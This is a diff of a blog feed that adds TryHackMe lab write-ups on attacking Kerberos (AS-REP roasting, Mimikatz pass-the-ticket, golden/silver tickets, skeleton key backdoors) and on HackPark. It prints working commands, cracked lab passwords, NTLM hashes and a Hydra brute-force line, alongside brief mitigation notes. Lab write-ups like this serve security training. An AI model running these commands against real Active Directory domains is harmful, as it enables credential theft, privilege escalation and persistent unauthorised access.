+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Building AS-REQ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;w/o preauth&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;&apos;CONTROLLER.local\User3&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] AS-REQ w/o preauth successful!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AS-REP &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;:
+
+      &lt;span class=&quot;nv&quot;&gt;$krb5asrep$User3&lt;/span&gt;@CONTROLLER.local:7EC95C29C0F996867A7F6C55FCADBC19&lt;span class=&quot;nv&quot;&gt;$3D22242B6DCDE&lt;/span&gt;
+      125D23AB664126C0FB562B6A09FA9733EA9138C6CF7A16532052EC17367EA9696A50C72EB391767F
+      AF279B3C5CE9E10831020208A8562878E505C554842FD6B52665F2F51496CBE80B53114DFB13DD3F
+      C659DF617BBFB376BF791350A25CC3AD382D2A2D5ADC34DEE47283F8D2177EAD3F2715246E6FC703
+      EEA7B8B304AE22ED3DFE33E908B0DA466434C692B62A8E4A0C8B0DBA10772AFFDBCFE0C87DF04DEA
+      E7FCAC64CEEC058A38B9833D560D45B06FF8B1D1115A8CB7DF9B47E6CBE5A1B8E6A7AD0096B3FA51
+      8DFA7285933F1A460CCCF32A8F43466C91ECC4159155228E763516C7B112497740C71A3511B
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;crack-those-hashes-w-hashcat&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Crack those Hashes w/ Hashcat&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Copy and put hashes into text files. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin2hash.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user3hash.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Insert &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23$&lt;/code&gt; after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$krb5asrep$&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 18200 admin2hash.txt Pass.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 18200 user3hash.txt Pass.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;as-rep-roasting-mitigations&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;AS-REP Roasting Mitigations&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Don’t turn off Kerberos Pre-Authentication unless it’s necessary there’s almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What hash type does AS-REP Roasting use?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Kerberos 5, etype 23, AS-REP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Which User is vulnerable to AS-REP Roasting?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;User3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the User’s Password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Password3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Which Admin is vulnerable to AS-REP Roasting?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Admin2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the Admin’s Password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;P@$$W0rd2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-6---pass-the-ticket-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 6 - Pass the Ticket w/ mimikatz&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;pass-the-ticket-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Pass the Ticket Overview&lt;/h3&gt;
+
+&lt;p&gt;Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin’s ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerberos05.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;prepare-mimikatz--dump-tickets&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Prepare Mimikatz &amp;amp; Dump Tickets&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt; - run mimikatz&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privilege::debug&lt;/code&gt; - Ensure this outputs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output &apos;20&apos; OK&lt;/code&gt; if it does not that means you do not have the administrator privileges to properly run mimikatz&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sekurlsa::tickets /export&lt;/code&gt; - this will export all of the .kirbi tickets into the directory that you are currently in&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier&lt;/li&gt;
+  &lt;li&gt;When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt (example below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;06/21/2022  12:33 AM             1,595 [0;6ea03]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pass-the-ticket-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Pass the Ticket w/ Mimikatz&lt;/h3&gt;
+
+&lt;p&gt;Now perform a pass the ticket attack to gain domain admin privileges.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerberos::ptt [0;6ea03]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi&lt;/code&gt; - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket&lt;/li&gt;
+  &lt;li&gt;exit mimikats and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;klist&lt;/code&gt; - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.&lt;/li&gt;
+  &lt;li&gt;we now have impersonated the ticket giving you the same rights as the TGT you’re impersonating. To verify this we can look at the admin share. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir \\10.10.146.3\admin$&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;pass-the-ticket-mitigation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Pass the Ticket Mitigation&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Don’t let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-7---goldensilver-ticket-attacks-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 7 - Golden/Silver Ticket Attacks w/ mimikatz&lt;/h2&gt;
+
+&lt;p&gt;If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.&lt;/p&gt;
+
+&lt;p&gt;A specific use scenario for a silver ticket would be that you want to access the domain’s SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain’s SQL server.&lt;/p&gt;
+
+&lt;h3 id=&quot;krbtgt-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;KRBTGT Overview&lt;/h3&gt;
+
+&lt;p&gt;In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.&lt;/p&gt;
+
+&lt;h3 id=&quot;goldensilver-ticket-attack-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Golden/Silver Ticket Attack Overview&lt;/h3&gt;
+
+&lt;p&gt;A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account’s SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerberos06.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dump-the-krbtgt-hash&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Dump the krbtgt hash&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;run mimikatz &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;ensure we output privilege 20 OK &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peivilege::debug&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /inject /name:krbtgt&lt;/code&gt; - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;create-goldensilver-ticket&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Create Golden/Silver Ticket&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:&lt;/code&gt; - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;in mimikats: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /inject /name:SQLService&lt;/code&gt; To create a silver ticket we need this for the service accout SID and the&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 00000455 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1109&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : SQLService
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary
+    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
+    LM   :
+  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
+    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
+    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;create out silver ticket: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103&lt;/code&gt; we replaced the administrator krbtgt with the SQLService NTLM hash and sid with our SQLService account SID and changed the ID to 1103.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103 &lt;/span&gt;
+User      : Administrator 
+Domain    : controller.local &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CONTROLLER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 1103
+Groups Id : &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;513 512 520 518 519
+ServiceKey: cd40c9ed96265531b21fc5b1dafcfb0a - rc4_hmac_nt
+Lifetime  : 6/21/2022 1:08:57 AM &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 6/18/2032 1:08:57 AM &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 6/18/2032 1:08:57 AM
+-&amp;gt; Ticket : ticket.kirbi
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PAC generated
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PAC signed
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; EncTicketPart generated
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; EncTicketPart encrypted 
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; KrbCred generated
+
+Final Ticket Saved to file &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;use-the-goldensilver-ticket-to-access-other-machines&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Use the Golden/Silver Ticket to access other machines&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misc:cmd&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# misc::cmd &lt;/span&gt;
+Patch OK &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; from &lt;span class=&quot;s1&quot;&gt;&apos;DisableCMD&apos;&lt;/span&gt; to &lt;span class=&quot;s1&quot;&gt;&apos;KiwiAndCMD&apos;&lt;/span&gt; @ 00007FF631EF43B8 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Access machine that we want. What we can access depends on the privileges of the user that we took the ticket from. However if we take the krbtgt we have access to the ENTIRE network (golden ticket).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-4&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the SQLService NTLM Hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /inject /name:SQLService&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;cd40c9ed96265531b21fc5b1dafcfb0a&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the Administrator NTLM Hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /inject /name:Administrator&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;2777b7fec870e04dda00cd7260f7bee6&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-8---kerberos-backdoors-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 8 - Kerberos Backdoors w/ mimikatz&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -“mimikatz”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;skeleton-key-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Skeleton Key Overview&lt;/h3&gt;
+
+&lt;p&gt;The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Install Skeleton key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misc::skeleton&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Access the forest with default credentials, example:&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net use \\CONTROLLER-1\admin$ /user:Administrator mimikatz&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-9---conclusion&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 9 - Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Resources&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a&lt;/li&gt;
+  &lt;li&gt;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat&lt;/li&gt;
+  &lt;li&gt;https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1&lt;/li&gt;
+  &lt;li&gt;https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/&lt;/li&gt;
+  &lt;li&gt;https://www.varonis.com/blog/kerberos-authentication-explained/&lt;/li&gt;
+  &lt;li&gt;https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don’t-Get-It-wp.pdf&lt;/li&gt;
+  &lt;li&gt;https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf&lt;/li&gt;
+  &lt;li&gt;https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+</description>
+        <pubDate>Mon, 20 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-Attacking-Kerberos</link>
+        <link href="http://localhost:4000/TryHackMe-Attacking-Kerberos"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Attacking-Kerberos</guid>
+      </item>
+    
+      <item>
         <title>TryHackMe - Nessus</title>
         <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/rpnessusredux&quot;&gt;https://tryhackme.com/room/rpnessusredux&lt;/a&gt;&lt;/p&gt;
 
@@ -157,8 +1311,6 @@
 
 &lt;p&gt;Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/hackpark02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
 &lt;hr /&gt;
 
 &lt;h2 id=&quot;task-1---deploy-the-vulnerable-windows-machine&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 - Deploy the vulnerable Windows machine&lt;/h2&gt;
@@ -223,6 +1375,10 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -t 16 -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.85.208 http-post-form &quot;/Account/login.aspx:__VIEWSTATE=DwoboO4H6Lg0TVWgRpjNYIfKsqKTMsi6KZ%2FrLpvJsIRyXNLRSf3AR8CTQMQTYcdrLBGAP%2FYDhPf8rKSl4hOkXldcWG7BXJ9ELa5Rq8rH0osikXzZMXuVA17TmDJ6KPlI3BFrN31Tw8troT51IiMPW9VhjPvhT96NGMusiERE9NDv1Hnfqv19MQnu2jmwQCefYRSh1T5mSmXl%2FDzykSgz6WRGKNFo8666FszWs1GgT%2FRDfl8PEOgpJIlYI5WQ3BpiM76RCqXETcYlPzjFDuHgR0OWP1QrrPCM8vf6YJozaosZ%2BWjlbQiCbqxkcXixtvfHE0kfoVNVr66Z%2FtNXfRDr67%2Fzz77%2FM6ywjkRiBN1%2Fdg5x7WeK&amp;amp;__EVENTVALIDATION=O%2FQ9GaTABmLsQKQUlAi8Z0FcLkfY6na0%2Fx4VNKOEmfdxE89nHewkLLaJzx96uT1fyeQFoIQYNtTiYaByuOlt682ZQ9ukMSDtwo7Mi9HYOdgj2zrPzayN2T9TYjl%2F8nWx2K1JetpiiOI1e0vO2FhO9OTKLgeOocGzPM1WciR5gWrO34MZ&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;ul&gt;
+  &lt;li&gt;bingo! admin:1qaz2wsx&lt;/li&gt;
+&lt;/ul&gt;
+
 &lt;p&gt;&lt;img src=&quot;/assets/hackpark01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
@@ -278,7 +1434,147 @@
   &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; to find system type for msfvenom&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systeminfo 
+c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;systeminfo
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA886
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          6/21/2022, 10:52:00 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:              1 Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows
+System Directory:          C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32
+Boot Device:               &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
+System Locale:             en-us&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;United States&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Input Locale:              en-us&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;United States&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Time Zone:                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UTC-08:00&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Pacific Time &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;US &amp;amp; Canada&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 3,213 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 4,500 MB
+Virtual Memory: In Use:    1,004 MB
+Page File Location&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:     C:&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;agefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                 8 Hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: KB2919355
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;02]: KB2919442
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;03]: KB2937220
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;04]: KB2938772
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05]: KB2939471
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;06]: KB2949621
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07]: KB3035131
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;08]: KB3060716
+Network Card&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:           1 NIC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
+                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: AWS PV Network Device
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;es&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
